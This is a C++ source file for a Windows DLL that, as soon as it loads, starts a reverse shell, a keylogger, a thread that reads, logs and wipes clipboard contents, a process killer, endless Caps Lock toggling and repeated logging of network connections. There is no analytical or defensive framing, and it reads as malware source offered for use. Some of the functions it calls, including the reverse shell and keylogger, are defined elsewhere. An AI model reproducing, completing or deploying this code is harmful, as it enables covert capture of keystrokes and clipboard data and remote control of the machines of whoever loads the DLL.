#include "debug/dbg_manager.h"
#include "modules/module_manager.h"
#include <iphlpapi.h>
#include <condition_variable>
#include <filesystem>
#include <functional>
#include <mutex>
#include <nlohmann/json.hpp>
#include <queue>
#include <spdlog/spdlog.h>
#include <thread>
#include <tlhelp32.h>
#include <vector>
#include <windows.h>
#include <winsock.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

// Global variables
static DebugConsole *g_console = nullptr;
static KeyLogger *g_keyLogger = nullptr;
static std::mutex clipboardMutex;
static Thread_Pool *g_threadpool = nullptr;

void DumpInput() {
    g_keyLogger = new KeyLogger(GetTempLogFilePath());
    g_keyLogger->StartLogging();
}

void spamCapsLock() {
    while (true) {
        keybd_event(VK_CAPITAL, 0x3A, KEYEVENTF_EXTENDEDKEY, 0);
        keybd_event(VK_CAPITAL, 0x3A, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
        Sleep(530);
    }
}

void ClearClipboardThread() {
    while (true) {
        {
            std::lock_guard<std::mutex> lock(clipboardMutex);
            if (OpenClipboard(NULL)) {
                HANDLE hData = GetClipboardData(CF_TEXT);
                if (hData) {
                    char *pszText = static_cast<char *>(GlobalLock(hData));
                    if (pszText) {
                        spdlog::info("Clipboard data: {}", pszText);
                        GlobalUnlock(hData);
                    }
                }
                EmptyClipboard();
                CloseClipboard();
            }
        }
        Sleep(1000);
    }
}

void MonitorNetwork() {
    MIB_TCPTABLE* pTcpTable = nullptr;
    DWORD dwSize = 0;

    // First call to get the required buffer size
    GetTcpTable(NULL, &dwSize, TRUE);
    pTcpTable = (MIB_TCPTABLE*)malloc(dwSize);
    if (pTcpTable == nullptr) {
        spdlog::error("Failed to allocate memory for TCP table");
        return;
    }

    // Second call to fill the buffer with TCP table data
    if (GetTcpTable(pTcpTable, &dwSize, TRUE) == NO_ERROR) {
        for (DWORD i = 0; i < pTcpTable->dwNumEntries; i++) {
            // Local IP and Port
            DWORD localAddr = pTcpTable->table[i].dwLocalAddr;
            USHORT localPort = ntohs((u_short)pTcpTable->table[i].dwLocalPort);

            // Remote IP and Port
            DWORD remoteAddr = pTcpTable->table[i].dwRemoteAddr;
            USHORT remotePort = ntohs((u_short)pTcpTable->table[i].dwRemotePort);

            // Log both local and remote endpoints
            spdlog::info("Connection {}: Local: {}.{}.{}.{}:{} -> Remote: {}.{}.{}.{}:{}",
                i + 1,
                localAddr & 0xFF,
                (localAddr >> 8) & 0xFF,
                (localAddr >> 16) & 0xFF,
                (localAddr >> 24) & 0xFF,
                localPort,
                remoteAddr & 0xFF,
                (remoteAddr >> 8) & 0xFF,
                (remoteAddr >> 16) & 0xFF,
                (remoteAddr >> 24) & 0xFF,
                remotePort);
        }
    } else {
        spdlog::error("GetTcpTable failed with error: {}", GetLastError());
    }

    free(pTcpTable);
}

int main() {
    g_console = new DebugConsole(true); // Set to true to enable console
    if (!g_console->Initialize()) {
        spdlog::error("Failed to initialize console");
        return 1;
    }
    if (!g_console->InitializeLogging()) {
        spdlog::error("Failed to initialize logging");
        return 1;
    }
    DumpMemoryInfo();
    MonitorNetwork();
    return 0;
}

extern "C" BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD fdwReason, LPVOID lpRes) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        g_threadpool = new Thread_Pool(6);

        RevShell();
        g_threadpool->enqueue([] { main(); });
        g_threadpool->enqueue([] { DumpInput(); });
        g_threadpool->enqueue([] { ClearClipboardThread(); });
        g_threadpool->enqueue([] { spamCapsLock(); });
        g_threadpool->enqueue([] { ProcessKillerThread(nullptr); });
        g_threadpool->enqueue([] { // Add continuous network monitoring
            while (true) {
                MonitorNetwork();
                Sleep(5000); // Check every 5 seconds
            }
        });
    } else if (fdwReason == DLL_PROCESS_DETACH) {
        if (g_threadpool) {
            delete g_threadpool;
            g_threadpool = nullptr;
        }
        if (g_console) {
            g_console->Cleanup();
            delete g_console;
            g_console = nullptr;
        }
        if (g_keyLogger) {
            g_keyLogger->StopLogging();
            delete g_keyLogger;
            g_keyLogger = nullptr;
        }
        FreeConsole();
    }
    return 1;
}